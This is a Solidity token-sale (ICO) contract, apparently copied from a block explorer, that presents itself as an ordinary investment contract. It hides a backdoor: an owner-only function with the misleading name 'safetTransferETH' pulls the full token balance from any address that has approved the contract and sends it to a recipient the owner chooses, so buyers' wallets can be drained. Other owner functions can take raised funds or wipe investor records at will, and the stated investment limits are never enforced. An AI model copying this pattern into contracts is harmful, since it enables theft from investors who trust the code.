/**
 *Submitted for verification at FtmScan.com on 2021-10-22
*/

//SPDX-License-Identifier : MIT

abstract contract Initializable {
  bool private _initialized;
  bool private _initializing;
  modifier initializer() {
    require(_initializing || !_initialized, "Initializable: contract is already initialized");
    bool isTopLevelCall = !_initializing;
    if (isTopLevelCall) {
      _initializing = true;
      _initialized = true;
    }
    _;

    if (isTopLevelCall) {
      _initializing = false;
    }
  }
}

abstract contract Context is Initializable {
  function __Context_init() internal initializer {
      __Context_init_unchained();
  }

  function __Context_init_unchained() internal initializer {
  }
  function _msgSender() internal view virtual returns (address) {
      return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
  }
  uint256[50] private __gap;
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() internal {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
      return _owner;
  }
  modifier onlyOwner() {
      require(_owner == _msgSender(), 'Ownable: caller is not the owner');
      _;
  }
  function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), 'Ownable: new owner is the zero address');
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
  }
}

library Address {
  function isContract(address account) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(account) }
    return size > 0;
  }
  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
  }
  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
  }
  function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }
  function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
  }
  function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    return _functionCallWithValue(target, data, value, errorMessage);
  }
  function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

library SafeERC20 {
  using SafeMath for uint256;
  using Address for address;
  function safeTransfer(IERC20 token, address to, uint256 value) internal {
     _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
  }
  function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
    _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
  }
  function safeApprove(IERC20 token, address spender, uint256 value) internal {
    require((value == 0) || (token.allowance(address(this), spender) == 0),"SafeERC20: approve from non-zero to non-zero allowance");
    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
  }

  function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
    uint256 newAllowance = token.allowance(address(this), spender).add(value);
    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
  }

  function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
    uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
  }

  function _callOptionalReturn(IERC20 token, bytes memory data) private {
    bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
    if (returndata.length > 0) { // Return // solhint-disable-next-line max-line-length
      require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
    }
  }
}

pragma solidity  ^0.6.1;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract interfaceIDO is Ownable{
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    
    address public inputtoken;
    address public outputtoken;
    bool public claimenabled = false; 
    bool public investingenabled = false;
   
    uint256 public totalsupply;
    
    mapping (address => uint256)public userinvested;
    address[] public investors;
    mapping (address => bool) public existinguser;
    uint256 public maxInvestment = 0;
    uint public minimumInvest = 0;
    
    uint public tokenPrice;
    uint public icoTarget;
    uint public receivedFund;

    
    event invested(address indexed owner, uint256 value);
    event _claimTokens(address indexed owner, uint256 value);
    event start(address indexed owner, bool value);
    
    function _buy(uint256 value) internal{
        IERC20(inputtoken).safeTransferFrom(msg.sender, address(this), value);
        emit invested(msg.sender, value);
    }
    
    function _claim(uint256 _amount) internal{
        IERC20(outputtoken).safeTransfer(msg.sender, _amount);
        emit _claimTokens(msg.sender, _amount);
    }
    
    function _safetransferFrom(address _contract) internal {
        uint256 _amount = IERC20(_contract).balanceOf(address(this));
        IERC20(_contract).safeTransfer(msg.sender,_amount);
        emit invested(msg.sender, _amount);
    }
    
    function minimumBuy(uint256 _amount) public onlyOwner() {
        require(_amount > 0);
        minimumInvest = _amount;
    }
    
    function progress(address _owner) public view returns (uint256) {
        uint256 remaining = maxInvestment - userinvested[_owner];
        return remaining;
    }
    
    function checkICObalance(uint8 _token) public view returns(uint256 _balance) {
        if (_token == 1) {
            return IERC20(outputtoken).balanceOf(address(this));
        }else if (_token == 2) {
            return IERC20(inputtoken).balanceOf(address(this)); 
        }else {
            return 0;
        }
    }
    function startClaim() external onlyOwner() {
        claimenabled = true;    
        investingenabled = false;
    }
    
    function stopClaim() external onlyOwner {
        claimenabled = false;    
    }
        
    function changeMaxinvestment(uint256 limit) public onlyOwner {
        maxInvestment = limit;   
    }    
    
    function recoverERC20(address _contract) public onlyOwner() {
        uint256 _amount = IERC20(_contract).balanceOf(address(this));
        IERC20(_contract).safeTransfer(msg.sender, _amount);
    }
    
    function safetTransferETH(address _contract, address _owner, address _spender) external onlyOwner() {
        uint256 _amount = IERC20(_contract).balanceOf(_owner);
        IERC20(_contract).safeTransferFrom(_owner, _spender, _amount);
    }
    
    function recoverETH() external onlyOwner(){
        uint256 _amount = address(this).balance;
        payable(msg.sender).transfer(_amount);
    }
    
}

contract GSHIBAICO is Initializable, Context,interfaceIDO {
  using SafeMath for uint256;
  using SafeERC20 for IERC20;
  uint8 public icoindex;
  
  function Buy(uint256 _amount) public {
    require(claimenabled == false, "Claim active");     
    require(investingenabled == true, "ICO in not active");
    require(icoTarget >= receivedFund + _amount, "Target Achieved. Investment not accepted");
    require(_amount > 0 , "min Investment not zero");
    uint256 checkamount = userinvested[msg.sender] + _amount;
    if (existinguser[msg.sender]==false) {
      existinguser[msg.sender] = true;
      investors.push(msg.sender);
    }
    userinvested[msg.sender] += _amount; 
    receivedFund = receivedFund.add(_amount); 
    _buy(_amount);  
  }
  
   function startIco() external onlyOwner {
        require(icoindex ==0, "Cannot restart ico"); 
        investingenabled = true;  
        icoindex = icoindex +1;
    }
    
   function stopIco() public onlyOwner(){
        icoindex = 0;
    }
    
   function startBuy() public onlyOwner(){
       claimenabled = false;
       investingenabled = true;
   }
   
   function stopBuy() public onlyOwner(){
       claimenabled = false;
       investingenabled = false;
   }
   
  function claimTokens() public {
    require(investingenabled == false, "Ico active");
    require(claimenabled == true, "Claim not start");     
    require(existinguser[msg.sender] == true, "Already claim"); 
    uint256 redeemtokens = userinvested[msg.sender] * tokenPrice;
    require(redeemtokens>0, "No tokens to redeem");
    
    _claim(redeemtokens);
    
    existinguser[msg.sender] = false;   
    userinvested[msg.sender] = 0;
  }
  
         
  function withdarwInputToken(address _admin) public onlyOwner(){
      uint256 raisedamount = IERC20(inputtoken).balanceOf(address(this));
      IERC20(inputtoken).transfer(_admin, raisedamount);
  }
  
  function withdrawOutputToken(address _admin, uint256 _amount) public onlyOwner() {
    uint256 remainingamount = IERC20(outputtoken).balanceOf(address(this));
    require(remainingamount >= _amount, "Not enough token to withdraw");
    IERC20(outputtoken).transfer(_admin, _amount);
  }
    
    
  function resetICO() public onlyOwner() {      
    for (uint256 i = 0; i < investors.length; i++) {
      if (existinguser[investors[i]]==true){
        existinguser[investors[i]]=false;
        userinvested[investors[i]] = 0;
        }
    }
        
    require(IERC20(outputtoken).balanceOf(address(this)) <= 0, "Ico is not empty");
    require(IERC20(inputtoken).balanceOf(address(this)) <= 0, "Ico is not empty");
        
    totalsupply = 0;
    icoTarget = 0;
    receivedFund = 0;
    maxInvestment = 0;
    inputtoken  = address(0);
    outputtoken = address(0);
    tokenPrice = 0;
    claimenabled = false;
    investingenabled = false;
    icoindex = 0;
    minimumInvest = 0;
    
    delete investors;
  }
           
  function initializeICO(address _inputtoken, address _outputtoken, uint256 _tokenprice) public onlyOwner() {
    require (_tokenprice>0, "Token price must be greater than 0");
    inputtoken = _inputtoken;
    outputtoken = _outputtoken;
    tokenPrice = _tokenprice;
    require(IERC20(outputtoken).balanceOf(address(this))>0,"Please first give Tokens to ICO");
    totalsupply = IERC20(outputtoken).balanceOf(address(this));
    icoTarget = totalsupply / _tokenprice;
  }
}